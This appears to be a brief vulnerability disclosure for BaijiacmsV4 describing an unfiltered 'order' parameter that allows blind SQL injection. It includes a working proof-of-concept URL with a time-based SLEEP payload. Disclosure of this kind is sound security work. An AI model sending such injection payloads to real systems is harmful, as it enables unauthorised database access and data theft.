# Baijiacms officials link

baijiacms: https://github.com/baijiacms/baijiacmsV4

# Why make this

BaijiacmsV4 does not open the issue,I can't feedback any issue,it's only possible to write up vulnerability here.

There is no filtering on parameter "order"，resulting in a vulnerability of blind sql injection,attackers can fetch data in databases easily，the vulnerability is so harmful.

PS:I submit the issue in this programer's another product which opens issue function 
https://github.com/baijiacms/baijiacmsV2-MultiManager/issues/2

# Poc

http://localhost/baijiacmsV4-master/index.php?act=index&beid=1&by=&cate=&do=goods&isdiscount=&ishot=&isnew=&isrecommand=&issendfree=&istime=&keywords=&m=eshop&merchid=&mod=mobile&op=get_list&order=(SELECT * FROM (SELECT(SLEEP(5))))
